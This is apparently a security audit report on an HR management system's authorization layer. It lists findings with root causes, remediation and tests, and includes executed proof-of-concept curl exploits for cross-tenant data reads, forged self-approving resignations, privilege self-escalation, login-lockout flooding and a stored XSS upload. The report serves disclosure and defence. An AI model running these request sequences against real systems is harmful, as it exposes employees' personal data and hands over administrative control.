# 05 — Security Review

**Method:** static review of the auth/RBAC layer plus live exploitation against a throwaway database
(`hrms_audit_test`) seeded with two employees in two different companies and three user accounts.
Every exploit below was **executed**, and the response is quoted verbatim.

**Test principals**

| Account | Roles | `employee.read` scope per docs/08 |
|---|---|---|
| `asha@audit.local` | `employee` | `own` — employee 1, company ACO |
| `bikram@audit.local` | `employee` | `own` — employee 2, company BCO |
| `it@audit.local` | `it_admin` | `readonly` — "directory basics; **NO salary/statutory visibility**" |

Result: **3 critical authorization bypasses, 2 high, and a broadly missing hardening layer.**

---

## 1. CRITICAL — Broken object-level authorization on the employee master
`OWASP A01:2021 — Broken Access Control` · findings [D1] [D2]

### Root cause
`withPermission()` resolves the caller's data scope into `context.permissionAccess` on **all 165**
permission-gated procedures (`backend/src/api/orpc.ts:130-147`). Only **4 of 24 modules** read it back —
`attendance` (one router), `audit`, `policies`, `reports`. The employees module never receives it, and
says so in its own comment:

```ts
// backend/src/modules/employees/employees.service.ts:87-92
 * ... Scope engine lands later; this keeps employee-role holders from reading
 * peers' PAN/Aadhaar.
```

Statutory-ID masking *is* applied. Nothing else is.

### Exploit
```bash
TA=$(curl -s -X POST http://localhost:5199/api/auth/login \
      -H 'Content-Type: application/json' \
      -d '{"identifier":"asha@audit.local","password":"…"}' | jq -r .accessToken)

curl -s -H "Authorization: Bearer $TA" http://localhost:5199/api/employees/BCO000001
```
```json
{ "ecode":"BCO000001", "name":"Bikram Beta", "dob":"1988-08-08",
  "personalEmail":"bikram.personal@example.com", "mobile":"9000000002",
  "presentAddress":"34 Beta Road, Durgapur", "category":"white_collar",
  "doj":"2024-02-01", "status":"active", "statusLabel":"Probation",
  "entity":"BCO", "entityName":"Beta Co",
  "statutoryMasked":true, "pan":null, "aadhaar":null,
  "canViewCompensation":true }
```
```bash
curl -s -H "Authorization: Bearer $TA" 'http://localhost:5199/api/employees?pageSize=50'
# → total=2, items from BOTH companies

curl -s -H "Authorization: Bearer $TA" http://localhost:5199/api/employees/facets
# → company-wide headcounts for every entity
```

### Impact
Every one of the 1,066 employees can enumerate the full master across all 14 legal entities and read each
colleague's **date of birth, personal email, mobile number, home address, emergency contact, blood group,
marital status, probation date and exit reason**. E-codes are sequential and predictable
(`RML035384`), so enumeration is trivial. This is the "plant HR sees another plant" scenario in its
broadest possible form, and a DPDP personal-data breach.

The same missing check applies to writes elsewhere:

| Endpoint | Permission (hr_ops scope) | What is unscoped |
|---|---|---|
| `GET /leave/balances/{employeeId}` | `leave.admin` (`org_unit`) | any employee's balances |
| `POST /leave/adjustments` | `leave.admin` (`org_unit`) | **writes** a ledger correction for any employee |
| `GET /documents` · `POST /documents` | `doc.vault.manage` (`org_unit`) | lists and uploads into any vault |
| `GET /letters/employee/{employeeId}` | `letters.issue` (`org_unit`) | any employee's letters |
| `GET /assets/…/{employeeId}` | `assets.manage` (`org_unit`) | any employee's assignments |

### Remediation
Make scope **structurally unavoidable**: change the repository signatures to require an `EmployeeScope`
argument so omitting it is a compile error, then fix every call site. The helper is already written and
correct — `src/core/rbac/employee-scope.ts` fails closed (returns `false` when no condition matches) and
`assertEmployeesInScope` exists for write paths. Return `404`, not `403`, for out-of-scope e-codes so the
API is not an existence oracle.

### Test that would have caught it
An access-matrix integration test: for each of the 12 roles, assert that an out-of-scope e-code returns
404 on `GET /employees/{ecode}` and is absent from `GET /employees`.

---

## 2. CRITICAL — Workflow subject spoofing leading to unattended self-approval
`OWASP A01 (BOLA) + A04:2021 Insecure Design` · findings [B2] [E1]

### Root cause
Two independent defects that compose into one catastrophe.

**(a) No authorization on the request subject.** `workflows.router.ts:20-45` takes
`subjectEmployeeId` straight from the client and `workflow.service.ts:298-323` inserts it with no check:

```ts
const subjectEmployeeId = input.subjectEmployeeId ?? context.user.employee_id;
// ...
const requestId = await createRequest(db, {
  definitionCode: input.definitionCode,
  subjectEmployeeId,               // ← never authorized
  requestedByUserId: context.user.id,
  payload: input.payload,
});
```

**(b) A fully vacant chain auto-approves.** `advance()` skips approvers that do not resolve, and when the
chain is exhausted it marks the request `approved`. plans/phase-1 Stage 1.3 P1-T10 records this as
intended: *"vacant approvers auto-skip with audit (chain exhausted → auto-approved ✓)"*.

### Exploit
```bash
curl -s -X POST -H "Authorization: Bearer $TA" -H 'Content-Type: application/json' \
  -d '{"definitionCode":"resignation",
       "payload":{"reason":"forged by another employee"},
       "subjectEmployeeId":2}' \
  http://localhost:5199/api/workflows/requests
# → {"requestId":1}
```
State immediately afterwards:
```
wf.requests
 id | definition_code | subject_employee_id | requested_by |  status
  1 | resignation     |                   2 |            1 | approved

wf.request_steps
 (0 rows)

core.audit_log
 2 | NULL | update | wf.requests | 1 | step_1 | skipped — approver 'reporting_manager' vacant
 3 | NULL | update | wf.requests | 1 | step_2 | skipped — approver 'role:hr_head' vacant
 4 | NULL | update | wf.requests | 1 | step_3 | skipped — approver 'role:hr_ops' vacant
```

### Impact
An ordinary employee in one company caused another company's employee to be **resigned**, with no
approver, no notification and no step record. Note that steps 2 and 3 are *role* steps: `role:hr_head`
and `role:hr_ops` resolved to zero holders and were skipped. In production this fires whenever:

- the subject has no reporting manager (new joiners; anyone whose RM row is null after import), **and**
- no active user holds `hr_head` / `hr_ops` — during setup, after a departure, or after any holder of
  `admin.roles` revokes the role (which §3 below shows is unbounded).

CLAUDE.md rule 8 — *"every workflow step records `notified_at`; the 'approver never notified' bug must be
impossible"* — is satisfied only vacuously. The invariant is true (no step can exist without a receipt)
and the guarantee is false (a resignation completed and nobody was told). This is PP-14 in a worse form
than the original.

The audit rows for the skips also carry `actor_user_id = NULL`, so the log cannot attribute the decision.

### Remediation
1. In `createRequest`, require `subjectEmployeeId === caller.employee_id` unless the caller holds a
   per-definition "raise on behalf of" permission, scope-checked with `assertEmployeesInScope`.
2. **Add a floor to the chain resolver.** If no step resolved to a real approver, the request must land in
   an HR fallback queue (`role:hr_head`, then `super_admin`) in status `pending` — never `approved` —
   with a step row recorded so the receipt invariant carries meaning. Emit an alert.
3. Attribute skip audit rows to a system actor rather than NULL.
4. Sponsor decision **D21** is required for the exact policy.

### Test
Integration test: a definition whose every approver is vacant ⇒ `status = 'pending'` and exactly one
fallback step. Plus: a non-subject raising a request for another employee ⇒ 403.

---

## 3. CRITICAL — Privilege escalation via unbounded `admin.roles`
`OWASP A01 + A04` · finding [D3]

### Root cause
All four RBAC mutation endpoints are guarded only by `withPermission('admin.roles')`
(`backend/src/modules/rbac/rbac.router.ts:63, 87, 117, 146`) with **no ceiling check, no self-grant
check, and no step-up**. docs/08 §2 requires *"grant ≤ own level"* and states as a hard rule that
`it_admin` **never** holds `compensation.read` and has *"no HR data authority (cannot see salaries)"*.

### Exploit
```bash
TI=$(login it@audit.local)

curl -s -X POST -H "Authorization: Bearer $TI" -H 'Content-Type: application/json' \
  -d '{"role":"it_admin","permission":"employee.compensation.read","scope":"all"}' \
  http://localhost:5199/api/rbac/grants          # → {"changed":true}

curl -s -X POST -H "Authorization: Bearer $TI" -H 'Content-Type: application/json' \
  -d '{"role":"it_admin","permission":"employee.statutory_ids.read","scope":"all"}' \
  http://localhost:5199/api/rbac/grants          # → {"changed":true}

curl -s -X POST -H "Authorization: Bearer $TI" -H 'Content-Type: application/json' \
  -d '{"userId":7,"role":"super_admin"}' \
  http://localhost:5199/api/rbac/user-roles      # → {"ok":true}

# re-login to pick up the new grants, then:
curl -s -H "Authorization: Bearer $TI2" http://localhost:5199/api/employees/ACO000001
```
```json
{ "ecode":"ACO000001", "statutoryMasked":false,
  "pan":"ABCDE1234F", "aadhaar":"111122223333", "uan":"100000000001",
  "bankAccount":"99887766554433", "bankIfsc":"HDFC0001234",
  "canViewCompensation":true }
```

### Impact
The IT administrator — the role explicitly excluded from HR data as a separation-of-duties control — read
another employee's **unmasked PAN, Aadhaar, UAN, bank account and IFSC** after three API calls, and now
holds `super_admin`, which includes `payroll.run.reopen` (the payroll unlock authority) and
`payroll.run.finalize`.

**A second, unexecuted variant is worse:** the same permission allows
`DELETE /api/rbac/grants {"role":"super_admin","permission":"admin.roles"}` and
`DELETE /api/rbac/user-roles` against every super_admin — an **unrecoverable lockout** of the whole
platform. I deliberately did not run it.

### Remediation
1. **Role lattice:** a grantor may never grant a permission it does not itself hold, nor assign a role
   whose grant-set exceeds its own.
2. **No self-targeting:** reject `userId === context.user.id` on assign/remove.
3. **`withStepUp('admin.roles')`** on all four endpoints — they are exactly the "reveals or moves
   power" case the step-up mechanism was built for.
4. **Last-admin guard** in the database: refuse a delete that would leave zero active `super_admin`
   assignments.
5. Alert on every `core.role_permissions` change (the audit row is written; nobody is watching it).

### Test
For each of the four endpoints, an it_admin acting on a higher-privileged role or on itself ⇒ 403.

---

## 4. HIGH — No rate limiting anywhere; account lockout is an unauthenticated DoS
`OWASP A07:2021 — Identification and Authentication Failures` · findings [D4] [D5]

`backend/src/app.ts` is 56 lines and installs `express.json()`, `cookieParser()` and the oRPC middleware.
There is no rate-limiting dependency in `package.json`.

```bash
for i in $(seq 1 30); do
  curl -s -o /dev/null -w '%{http_code} ' -X POST http://localhost:5199/api/auth/login \
    -H 'Content-Type: application/json' -d "{\"identifier\":\"asha@audit.local\",\"password\":\"wrong$i\"}"
done
# 401 ×30, elapsed 1s
```
```sql
SELECT email, failed_attempts, locked_until FROM core.users WHERE email='asha@audit.local';
-- asha@audit.local | 5 | 2026-09-04 23:44:20+05:30
```

Lockout works as designed (5 failures, exponential backoff) — and that is the problem. It is
attacker-triggerable with no IP throttle, so **~5,330 unauthenticated requests locks all 1,066 accounts**.
On the 28th of a month, that stops payroll. There is no admin unlock endpoint either: `admin.users` is
seeded but enforced by no procedure ([B5]).

The password-reset endpoint is equally unthrottled — 40 consecutive `POST /auth/password/forgot` calls all
returned `200`. It correctly reuses a live token rather than minting 40 (only 3 rows created), and it does
not leak account existence, but once SMTP is wired it becomes an email-bombing amplifier.

`POST /ird/whistle/file` and `POST /ird/posh/file-anonymous` are unauthenticated writes whose only guard is:
```ts
// backend/src/modules/ird/ird.service.ts:288
export function whistleRateLimitOk(ip: string | null): boolean {
  void ip;
  return true;
}
```
The route summary says *"(rate-limit stub)"*, and `tests/ird-posh.unit.test.ts:18` asserts the stub returns
`true` — a green test for an unimplemented control.

**Remediation:** IP + account token buckets on `/auth/*`, a global limiter on `/api/*`, strict limits on
anonymous intake with a CAPTCHA or signed intake token, and `app.set('trust proxy', …)` so `req.ip` is
real behind the reverse proxy. Pair lockout with progressive delay and an audited admin unlock.

---

## 5. HIGH — No security headers, no CORS policy, no error handler
`OWASP A05:2021 — Security Misconfiguration` · findings [D6] [D7] [D8]

```
$ curl -i http://localhost:5199/health
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 114
ETag: W/"72-f76Y+xMdlP3Ca0upbnLdx+f4cGw"
Date: Fri, 04 Sep 2026 17:57:52 GMT
Connection: keep-alive
```

Absent: `Strict-Transport-Security`, `X-Content-Type-Options`, `X-Frame-Options` / `frame-ancestors`,
`Content-Security-Policy`, `Referrer-Policy`, `Permissions-Policy`. `helmet` is not a dependency.
`X-Powered-By` is left on.

**CORS:** `.env.example:31` advertises `CORS_ORIGIN`; nothing reads it and `cors` is not installed.
Development works only because Vite proxies `/api`. The production browser boundary is undefined.

**Errors:** there is no terminal error middleware, so an unhandled throw escapes as Express's HTML page:
```
HTTP 413
<!DOCTYPE html><html lang="en"><head>…<title>Error</title></head><body>
<pre>PayloadTooLargeError: request entity too large<br> &nbsp; &nbsp;at readStream
(/Users/anooppratapsingh/Documents/HRM…
```
Absolute filesystem paths and the dependency tree leak to any client, and the frontend's error parser
(`frontend/src/lib/api.ts:74-79`) cannot extract a message from HTML, so the user is shown
*"Request failed (413)"* with no explanation.

**Remediation:** `app.use(helmet({ contentSecurityPolicy: {…} }))`; `app.disable('x-powered-by')`; an
explicit CORS origin allowlist from validated env; a terminal error middleware that logs with a traceId
and returns the JSON envelope.

---

## 6. HIGH — Unvalidated file upload; stored HTML accepted as an identity document
`OWASP A03:2021 — Injection (stored XSS) / unrestricted file upload` · findings [D9] [D10]

`documents.router.ts:144,182` accept `mime: z.string().min(1).max(120)` and `content: z.string().min(1)`
with **no `.max()`**. Neither `vault.service.ts` nor `core/storage/documents.ts` validates MIME, sniffs
magic bytes, or caps size.

```bash
python3 -c "import base64,json;b=base64.b64encode(b'<script>alert(document.domain)</script>').decode();
print(json.dumps({'documentType':'pan','fileName':'pan.html','mime':'text/html','content':b}))" > xss.json
curl -s -X POST -H "Authorization: Bearer $TA" -H 'Content-Type: application/json' \
  --data-binary @xss.json http://localhost:5199/api/documents/mine
# → {"id":1}
```
```
core.documents
 id | kind |                path                 | original_name |   mime    | size_bytes
  1 | pan  | pan/2026/09/9139d7c6-….html         | pan.html      | text/html |         39
```

**Currently latent** — the documents module has no download endpoint at all ([E6]), so the bytes cannot be
served back yet. But the row is stored, HR sees `pan.html` as an employee's identity document, and the
`policies` and `letters` modules **do** serve content from the same store. Combined with the absent CSP
(§5) and the access token in `sessionStorage` ([D17]), a download endpoint built without
`Content-Disposition: attachment` would be immediate account takeover.

**Two things that are done right:** `documentType` is validated against the `doc.types` catalog, so
`'../../escape'` is rejected with `400 Unknown document type`; and `LocalDiskStorage.resolve()`
(`core/storage/storage.ts:20-27`) blocks path traversal properly.

**Also functional, not just security:** `express.json()` uses the default 100 kB limit, so a 250 KB
document is rejected outright. Every real scanned PAN, Aadhaar or appointment letter is larger. DOC-02,
CORE-13 and CORE-09 do not work with real files.

**Remediation:** per-`doc.types` MIME allowlist, magic-byte sniffing, an explicit size cap, filename
sanitisation, and — on the download endpoint when it is built — `Content-Disposition: attachment` plus
`X-Content-Type-Options: nosniff`, served from a separate origin if possible.

---

## 7. MEDIUM — Session, token and confidentiality issues

| # | Issue | Evidence | Finding |
|---|---|---|---|
| 7.1 | **Refresh tokens are not rotated.** `refresh()` mints a new refresh JWT with the same `sid` and never invalidates the presented one, which stays valid for its full 7 days. No reuse detection. The route summary and plans/phase-0 both claim rotation. **Mitigated** by the `sec.sessions` liveness check, which is genuinely good. | `auth.service.ts:98-121` | [D13] |
| 7.2 | **`ceo_cell` can read individual compensation.** The seed grants `employee.compensation.read` with a `note: 'aggregates only'` that no code reads; docs/08 §3 says individual visibility requires hr_head or payroll. | `seed-data.ts:275`, `employees.service.ts:253` | [D11] |
| 7.3 | **The `readonly` scope is a silent alias for `all`.** `all: scopes.has('all') \|\| scopes.has('readonly')` — a scope that reads in the RBAC console as a safety property restricts nothing. Held by ceo_cell, it_admin, dpo, compliance_officer and payroll_admin. | `permissions.service.ts:63` | [D12] |
| 7.4 | **Insecure default JWT secret** in the app factory (`'insecure-test-only-secret-never-in-production!'`). Unreachable from `src/index.ts` today; one refactor from a forgeable-token bypass. | `app.ts:21` | [D14] |
| 7.5 | **Access token in `sessionStorage`** with no CSP behind it. The httpOnly refresh cookie is correct. | `frontend/src/lib/session.ts:28-40` | [D17] |
| 7.6 | **Env validation covers 4 of ~12 variables** — `SMTP_*`, `S3_*`, `CORS_ORIGIN`, `ATS_JWT_PUBLIC_KEY`, `STORAGE_DIR` are unvalidated, so a missing SMTP host in production is silent. | `core/config/env.ts:8-13` | [D15] |
| 7.7 | **`jwtVerify` does not pin `algorithms`** or check `audience`. Low risk — `jose` restricts a symmetric key to HMAC — but it is one line. | `core/auth/jwt.ts:75` | [D18] |
| 7.8 | **The sensitive-access log is never written**, so there is no record of who viewed whose statutory IDs (SEC-10/11, DPDP accountability). | `recordAccess()` has no callers | [C5] |
| 7.9 | **All 51 policy settings are readable by any authenticated user**, including lockout and OT-lapse thresholds. | `settings.router.ts:19-40` | [B3] |
| 7.10 | **`GET /workflows/preview` discloses any employee's approval chain** including approver names. | `workflows.router.ts:180-215` | [E12] |
| 7.11 | **4 npm advisories in production dependencies**, one high (`brace-expansion`), three moderate (`qs` — Express's query parser — and `uuid` ×2 via `exceljs`). Frontend: 0. | `npm audit --omit=dev` | [D16] |

---

## 8. Credential hygiene — rotate these

| Item | Where | Action |
|---|---|---|
| greytHR account credentials | docs/09 recon; conversation history | **Rotate.** Read-only recon account, but shared in chat. |
| EMS / Yatra Avedan SSH credentials | docs/11 recon; conversation history | **Rotate.** |
| MinIO / MongoDB Atlas credentials (Yatra Avedan) | docs/11 §4b | **Rotate**, then decommission with the system. |
| Local dev `JWT_SECRET` | `backend/.env` (gitignored ✓) | Generate a distinct production secret; never reuse the dev value. |
| `'insecure-test-only-secret-never-in-production!'` | `backend/src/app.ts:21`, in git | Not a real secret, but it is a published constant that would sign valid tokens if it ever reached production. Guard it. |
| Demo `super_admin` account | created by `scripts/create-dev-all-roles.ts` for walkthroughs | **Delete or rotate before any shared environment.** The script prints a generated password to stdout. |

No hardcoded credential was found in application source. `.env` is correctly gitignored and `.env.example`
carries only placeholders.

---

## 9. What the security layer gets right

Recorded so that remediation does not regress it — detail in [`02-WHATS-WORKING.md`](02-WHATS-WORKING.md) §8.

Server-side session validation on every request (so revoke and "sign out everywhere" are real, not
cosmetic) · TOTP MFA with recovery codes and a policy-driven enforcement mode · step-up re-authentication
with a distinct error class the client retries without losing the user's work · password policy with
history and reuse rejection · single-use, reuse-checked password-reset tokens · bcrypt · exponential
lockout backoff · no user-enumeration oracle on login or reset · correct statutory-ID masking (verified
live) · path-traversal-safe storage · document-type catalog validation · a hash-chained, DB-computed,
append-only audit log with a verification function that has caught a forged row in test · `pino` redaction
of password, Aadhaar, PAN, bank account and the Authorization header.

The primitives are good. The failure is that three of them were never connected to the endpoints they
were built to protect.
